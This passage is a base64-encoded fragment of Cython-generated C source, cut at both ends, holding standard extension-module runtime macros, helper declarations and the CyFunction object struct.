BfX1B5eF9QeVVuaWNvZGVfQ29uY2F0X19QeXhfUmVmZXJlbmNlU2hhcmluZ19EZWZpbml0ZWx5VW5pcXVlSW5QbGFjZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0XG4jZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX093blN0cm9uZ1JlZmVyZW5jZUluUGxhY2UgX19QeXhfUHlVbmljb2RlX0NvbmNhdFxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0X19QeXhfUmVmZXJlbmNlU2hhcmluZ19GdW5jdGlvbkFyZ3VtZW50SW5QbGFjZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0XG4jZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX1NoYXJlZFJlZmVyZW5jZUluUGxhY2UgX19QeXhfUHlVbmljb2RlX0NvbmNhdFxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX0RlZmluaXRlbHlVbmlxdWVJblBsYWNlU2FmZShsZWZ0LCByaWdodClcXFxuICAgICgodW5saWtlbHkoKGxlZnQpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChyaWdodCkgPT0gUHlfTm9uZSkpID9cXFxuICAgIFB5TnVtYmVyX0luUGxhY2VBZGQobGVmdCwgcmlnaHQpIDogX19QeXhfUHlVbmljb2RlX0NvbmNhdF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfRGVmaW5pdGVseVVuaXF1ZUluUGxhY2UobGVmdCwgcmlnaHQpKVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0X19QeXhfUmVmZXJlbmNlU2hhcmluZ19Pd25TdHJvbmdSZWZlcmVuY2VJblBsYWNlU2FmZShsZWZ0LCByaWdodClcXFxuICAgICgodW5saWtlbHkoKGxlZnQpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChyaWdodCkgPT0gUHlfTm9uZSkpID9cXFxuICAgIFB5TnVtYmVyX0luUGxhY2VBZGQobGVmdCwgcmlnaHQpIDogX19QeXhfUHlVbmljb2RlX0NvbmNhdF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfT3duU3Ryb25nUmVmZXJlbmNlSW5QbGFjZShsZWZ0LCByaWdodCkpXG4jZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX0Z1bmN0aW9uQXJndW1lbnRJblBsYWNlU2FmZShsZWZ0LCByaWdodClcXFxuICAgICgodW5saWtlbHkoKGxlZnQpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChyaWdodCkgPT0gUHlfTm9uZSkpID9cXFxuICAgIFB5TnVtYmVyX0luUGxhY2VBZGQobGVmdCwgcmlnaHQpIDogX19QeXhfUHlVbmljb2RlX0NvbmNhdF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfRnVuY3Rpb25Bcmd1bWVudEluUGxhY2UobGVmdCwgcmlnaHQpKVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0X19QeXhfUmVmZXJlbmNlU2hhcmluZ19TaGFyZWRSZWZlcmVuY2VJblBsYWNlU2FmZShsZWZ0LCByaWdodClcXFxuICAgICgodW5saWtlbHkoKGxlZnQpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChyaWdodCkgPT0gUHlfTm9uZSkpID9cXFxuICAgIFB5TnVtYmVyX0luUGxhY2VBZGQobGVmdCwgcmlnaHQpIDogX19QeXhfUHlVbmljb2RlX0NvbmNhdF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfU2hhcmVkUmVmZXJlbmNlSW5QbGFjZShsZWZ0LCByaWdodCkpXG5cblxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbUJJbnRfYmludCh2YWx1ZSlcXFxuICAgICgodmFsdWUpID8gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UcnVlKSA6IF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRmFsc2UpKVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcoUHlPYmplY3QgKmZ1bmMpO1xuXG5cbiNpZiAhKENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKSlcbnN0YXRpYyBpbnQgX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqKm1ldGhvZCk7XG4jZW5kaWZcblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBtZXRob2RfbmFtZSk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5vbmVOb3RJdGVyYWJsZUVycm9yKHZvaWQpO1xuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1VucGFja1R1cGxlRXJyb3IoUHlPYmplY3QgKiwgUHlfc3NpemVfdCBpbmRleCk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X3VucGFja190dXBsZTIoXG4gICAgUHlPYmplY3QqIHR1cGxlLCBQeU9iamVjdCoqIHZhbHVlMSwgUHlPYmplY3QqKiB2YWx1ZTIsIGludCBpc190dXBsZSwgaW50IGhhc19rbm93bl9zaXplLCBpbnQgZGVjcmVmX3R1cGxlKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF91bnBhY2tfdHVwbGUyX2V4YWN0KFxuICAgIFB5T2JqZWN0KiB0dXBsZSwgUHlPYmplY3QqKiB2YWx1ZTEsIFB5T2JqZWN0KiogdmFsdWUyLCBpbnQgZGVjcmVmX3R1cGxlKTtcbnN0YXRpYyBpbnQgX19QeXhfdW5wYWNrX3R1cGxlMl9nZW5lcmljKFxuICAgIFB5T2JqZWN0KiB0dXBsZSwgUHlPYmplY3QqKiB2YWx1ZTEsIFB5T2JqZWN0KiogdmFsdWUyLCBpbnQgaGFzX2tub3duX3NpemUsIGludCBkZWNyZWZfdHVwbGUpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9kaWN0X2l0ZXJhdG9yKFB5T2JqZWN0KiBkaWN0LCBpbnQgaXNfZGljdCwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCogcF9vcmlnX2xlbmd0aCwgaW50KiBwX2lzX2RpY3QpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2RpY3RfaXRlcl9uZXh0KFB5T2JqZWN0KiBkaWN0X29yX2l0ZXIsIFB5X3NzaXplX3Qgb3JpZ19sZW5ndGgsIFB5X3NzaXplX3QqIHBwb3MsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QqKiBwa2V5LCBQeU9iamVjdCoqIHB2YWx1ZSwgUHlPYmplY3QqKiBwaXRlbSwgaW50IGlzX2RpY3QpO1xuXG5cbiNkZWZpbmUgX19QeXhfUHlFeGNfS2V5Ym9hcmRJbnRlcnJ1cHRfQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrKG9iaiwgUHlFeGNfS2V5Ym9hcmRJbnRlcnJ1cHQpXG5cblxuI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxNZXRob2RfQ2FsbEZyb21CdWlsZGVyIFB5T2JqZWN0X1ZlY3RvcmNhbGxNZXRob2RcbiNlbHNlXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X09iamVjdF9WZWN0b3JjYWxsTWV0aG9kX0NhbGxGcm9tQnVpbGRlcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfQ2hlY2tLZXl3b3JkU3RyaW5ncyhjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLCBQeU9iamVjdCAqa3cpO1xuXG5cbiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuI2RlZmluZSBfX1BZWF9DSEVDS19GSU5BTF9UWVBFX0ZPUl9GUkVFTElTVFModCwgZXhwZWN0ZWRfdHAsIGV4cGVjdGVkX3NpemUpICgoaW50KSAoKHQpID09IChleHBlY3RlZF90cCkpKVxuI2RlZmluZSBfX1BZWF9DSEVDS19UWVBFX0ZPUl9GUkVFTElTVF9GTEFHUyAgUHlfVFBGTEFHU19JU19BQlNUUkFDVFxuI2Vsc2VcbiNkZWZpbmUgX19QWVhfQ0hFQ0tfRklOQUxfVFlQRV9GT1JfRlJFRUxJU1RTKHQsIGV4cGVjdGVkX3RwLCBleHBlY3RlZF9zaXplKSAoKGludCkgKCh0KS0+dHBfYmFzaWNzaXplID09IChleHBlY3RlZF9zaXplKSkpXG4jZGVmaW5lIF9fUFlYX0NIRUNLX1RZUEVfRk9SX0ZSRUVMSVNUX0ZMQUdTICAoUHlfVFBGTEFHU19JU19BQlNUUkFDVCB8IFB5X1RQRkxBR1NfSEVBUFRZUEUpXG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfQ0hFQ0tfVFlQRV9GT1JfRlJFRUxJU1RTKHQsIGV4cGVjdGVkX3RwLCBleHBlY3RlZF9zaXplKVxcXG4gICAgKF9fUFlYX0NIRUNLX0ZJTkFMX1RZUEVfRk9SX0ZSRUVMSVNUUygodCksIChleHBlY3RlZF90cCksIChleHBlY3RlZF9zaXplKSkgJlxcXG4gICAgIChpbnQpICghX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoKHQpLCBfX1BZWF9DSEVDS19UWVBFX0ZPUl9GUkVFTElTVF9GTEFHUykpKVxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9BbGxvY2F0ZUV4dGVuc2lvblR5cGUoUHlUeXBlT2JqZWN0ICp0LCBpbnQgaXNfZmluYWwpO1xuXG5cbiNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApXG4jZGVmaW5lIF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCBhbHdheXNfY2FsbCwgdmlzaXQsIGFyZykgMFxuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKFB5T2JqZWN0ICpvLCBpbnQgYWx3YXlzX2NhbGwsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKTtcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApO1xuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCwgUHlPYmplY3QgKmssIFB5T2JqZWN0ICp2KTtcbiNkZWZpbmUgX19QeXhfU2V0SXRlbU9uVHlwZURpY3QodHAsIGssIHYpIF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCgoUHlUeXBlT2JqZWN0Kil0cCwgaywgdilcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhQeVR5cGVfU3BlYyAqc3BlYywgUHlUeXBlT2JqZWN0ICp0eXBlKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG5zdGF0aWMgaW50IF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKGNvbnN0IGNoYXIgKnR5cGVfbmFtZSwgUHlfc3NpemVfdCBkaWN0b2Zmc2V0LCBQeU9iamVjdCAqYmFzZXMpO1xuI2VuZGlmXG5cblxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9SZWFkeShQeVR5cGVPYmplY3QgKnQpO1xuXG5cbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiNkZWZpbmUgX19QeXhfSGFzQXR0cihvLCBuKSAgUHlPYmplY3RfSGFzQXR0cldpdGhFcnJvcihvLCBuKVxuI2Vsc2VcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9IYXNBdHRyKFB5T2JqZWN0ICosIFB5T2JqZWN0ICopO1xuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnQoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqaW1wb3J0ZWRfbmFtZXMsIFB5X3NzaXplX3QgbGVuX2ltcG9ydGVkX25hbWVzLCBQeU9iamVjdCAqcXVhbG5hbWUsIGludCBsZXZlbCk7XG5cblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9JbXBvcnRGcm9tKFB5T2JqZWN0KiBtb2R1bGUsIFB5T2JqZWN0KiBuYW1lKTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuI2RlZmluZSBfX1B5eF9TZXROYW1lSW5DbGFzcyhucywgbmFtZSwgdmFsdWUpXFxcbiAgICAobGlrZWx5KFB5RGljdF9DaGVja0V4YWN0KG5zKSkgPyBfUHlEaWN0X1NldEl0ZW1fS25vd25IYXNoKG5zLCBuYW1lLCB2YWx1ZSwgKChQeUFTQ0lJT2JqZWN0ICopIG5hbWUpLT5oYXNoKSA6IFB5T2JqZWN0X1NldEl0ZW0obnMsIG5hbWUsIHZhbHVlKSlcbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuI2RlZmluZSBfX1B5eF9TZXROYW1lSW5DbGFzcyhucywgbmFtZSwgdmFsdWUpXFxcbiAgICAobGlrZWx5KFB5RGljdF9DaGVja0V4YWN0KG5zKSkgPyBQeURpY3RfU2V0SXRlbShucywgbmFtZSwgdmFsdWUpIDogUHlPYmplY3RfU2V0SXRlbShucywgbmFtZSwgdmFsdWUpKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfU2V0TmFtZUluQ2xhc3MobnMsIG5hbWUsIHZhbHVlKSAgUHlPYmplY3RfU2V0SXRlbShucywgbmFtZSwgdmFsdWUpXG4jZW5kaWZcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0NhbGN1bGF0ZU1ldGFjbGFzcyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKmJhc2VzKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5M01ldGFjbGFzc1ByZXBhcmUoUHlPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKmJhc2VzLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpta3csIFB5T2JqZWN0ICptb2RuYW1lLCBQeU9iamVjdCAqZG9jKTtcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHkzQ2xhc3NDcmVhdGUoUHlPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpiYXNlcywgUHlPYmplY3QgKmRpY3QsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpta3csIGludCBjYWxjdWxhdGVfbWV0YWNsYXNzLCBpbnQgYWxsb3dfcHkyX21ldGFjbGFzcyk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9TZXREZWZhdWx0KFB5T2JqZWN0ICpkLCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqZGVmYXVsdF92YWx1ZSk7XG5cblxuI2lmICgoQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgKSB8fFxcXG4gICAgIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwKVxuICBzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZihjb25zdCBjaGFyICpuYW1lKTtcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKG5hbWUpIFB5SW1wb3J0X0FkZE1vZHVsZVJlZihuYW1lKVxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSh2b2lkKTtcblxuXG5zdGF0aWMgUHlUeXBlT2JqZWN0KiBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcyk7XG5cblxuc3RhdGljIGludCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KFB5T2JqZWN0ICptb2R1bGUpO1xuI2RlZmluZSBfX1B5eF9Db21tb25UeXBlc01ldGFjbGFzc19VU0VEXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU1ldGhvZF9OZXcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwKTtcblxuXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgQ1lUSE9OX1ZFQ1RPUkNBTExcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdyk7XG4jZW5kaWZcblxuXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fVVNFRFxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCAgMHgwMVxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NMQVNTTUVUSE9EICAgMHgwMlxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NDTEFTUyAgICAgICAgMHgwNFxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NPUk9VVElORSAgICAgMHgwOFxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0dldENsb3N1cmUoZilcXFxuICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbG9zdXJlKVxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKVxcXG4gICAgICAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSktPmZ1bmNfY2xhc3NvYmopXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZilcXFxuICAgICAgKChQeU9iamVjdCopICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooZiwgY2xhc3NvYmopXFxcbiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaigoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZiksIChjbGFzc29iaikpXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fRGVmYXVsdHModHlwZSwgZilcXFxuICAgICgodHlwZSAqKSgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHMpKVxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzR2V0dGVyKGYsIGcpXFxcbiAgICAoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHNfZ2V0dGVyID0gKGcpXG50eXBlZGVmIHN0cnVjdCB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0X0hFQURcbiAgICBQeU9iamVjdCAqZnVuYztcbiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMVxuICAgIFB5Q0Z1bmN0aW9uT2JqZWN0IGZ1bmM7XG4jZWxzZVxuICAgIFB5Q01ldGhvZE9iamVjdCBmdW5jO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGZ1bmNfdmVjdG9yY2FsbDtcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqZnVuY193ZWFrcmVmbGlzdDtcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZ1bmNfZGljdDtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpmdW5jX25hbWU7XG4gICAgUHlPYmplY3QgKmZ1bmNfcXVhbG5hbWU7XG4gICAgUHlPYmplY3QgKmZ1bmNfZG9jO1xuICAgIFB5T2JqZWN0ICpmdW5jX2dsb2JhbHM7XG4gICAgUHlPYmplY3QgKmZ1bmNfY29kZTtcbiAgICBQeU9iamVjdCAqZnVuY19jbG9zdXJlO1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZ1bmNfY2xhc3NvYmo7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqZGVmYXVsdHM7XG4gICAgaW50IGZsYWdzO1xuICAgIFB5T2JqZWN0ICpkZWZhdWx0c190dXBsZTtcbiAgICBQeU9iamVjdCAqZGVmYXVsdHNfa3dkaWN0O1xuICAgIFB5T2JqZWN0ICooKmRlZmF1bHRzX2dldHRlcikoUHlPYmplY3QgKik7XG4gICAgUHlPYmplY3QgKmZ1bmNfYW5ub3RhdGlvbnM7XG4gICAgUHlPYmplY3QgKmZ1bmNfaXNfY29yb3V0aW5lO1xufSBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0O1xuI3VuZGVmIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVja1xuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKG9iaikgIF9fUHl4X1R5cGVDaGVjayhvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKVxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrMihvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlLCAmUHlDRnVuY3Rpb25fVHlwZSlcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KG9iaikgIF9fUHl4X0lTX1RZUEUob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSk7XG4jdW5kZWYgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uXG4jZGVmaW5lIF9fUHl4X0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYykgICBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihmdW5jLCBjZnVuYylcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIG9wLCBQeU1ldGhvZERlZiAqbWwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooX19weXhfQ3lGdW5jdGlvbk9iamVjdCogZiwgUHlPYmplY3QqIGNsYXNzb2JqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXREZWZhdWx0cyhQeU9iamVjdCAqZnVuYyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5VHlwZU9iamVjdCAqZGVmYXVsdHNfdHlwZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqbSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp0dXBsZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNLd0RpY3QoUHlPYmplY3QgKm0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqbSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpO1xuc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuc3RhdGljIFB5T2J